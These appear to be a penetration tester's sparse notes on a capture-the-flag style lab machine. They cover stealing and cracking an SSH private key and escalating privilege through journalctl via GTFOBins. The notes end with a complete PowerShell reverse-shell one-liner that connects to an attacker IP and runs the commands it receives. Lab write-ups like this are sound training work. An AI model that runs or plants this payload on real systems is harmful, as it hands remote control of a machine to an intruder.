# Information gathering

## Port Scan

``` bash
10.10.10.165
```
![[Pasted image 20230201115700.png]]
## Service Enumerate

### Web Enumerate

### Service 2


## Password Crack
### john

### hydra


# Exploit

## Initial Foothold

### Exploit method

### Vulnerability Explanation

### Exp code or link

### Proof screen shot

![[Pasted image 20230201151630.png]]

## Lateral Movement

download .ssh id_rsa file 
![[Pasted image 20230201163355.png]]

### Exploit method

crack encrypted id_rsa with johntheripper

### Exp code or link

### Proof screen shot


## Privilege Escalation
![[Pasted image 20230201170621.png]]
### Exploit method
gtfbins 中可以了解到https://gtfobins.github.io/gtfobins/journalctl/
设置 rows 3保证触发less 自动分页
### Exp code or link

### Proof screen shot

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.16.5",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![[Pasted image 20230201170751.png]]